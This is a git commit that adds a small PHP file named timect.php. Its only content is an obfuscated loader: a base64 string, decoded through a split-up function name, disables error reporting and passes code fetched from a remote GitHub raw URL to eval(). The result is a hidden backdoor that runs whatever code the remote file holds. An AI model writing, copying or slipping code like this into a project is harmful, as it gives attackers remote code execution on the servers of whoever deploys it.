2f52cdbe9db544386a8e824fdbb56850bec92c86
cl1122 <cindylara1122@gmail.com>
2024-11-24 16:15:50 +0700

    Create timect.php

---
+++ one/timect.php
@@ -0,0 +1,6 @@
+<?php
+$z = "QG51bGw7IEBlcnJvcl9yZXBvcnRpbmcoMCk7QG51bGw7IEBldmFsKCI/PiIuZmlsZV9nZXRfY29udGVudHMoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9jaW5keWxhcmExMTIyL2VqZWN0L21haW4vMS8yLzMvNC81L2VkaXR0aW1lLnBocCIpKT8+";
+$a = "base"; $b = "64_decode"; $c = $a.$b;
+$string = $c($z);
+eval($string);
+?>
